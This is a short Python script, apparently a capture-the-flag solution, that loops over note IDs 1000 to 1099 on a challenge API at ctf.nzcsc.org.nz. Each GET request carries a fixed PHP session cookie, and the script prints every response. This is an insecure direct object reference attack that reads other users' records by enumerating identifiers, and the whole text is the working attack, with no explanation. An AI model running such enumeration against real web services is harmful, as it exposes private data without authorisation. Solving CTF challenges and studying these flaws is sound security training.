import http.client

conn = http.client.HTTPSConnection("ctf.nzcsc.org.nz")
payload = ''
headers = {
  'Cookie': 'PHPSESSID=5b46175213f56d5117a5f71bd1146a18; path=/'
}

for i in range(1000, 1100):
  conn.request("GET", "/challenge4/api.php/note/"+str(i), payload, headers)
  res = conn.getresponse()
  data = res.read()
  print(data.decode("utf-8"))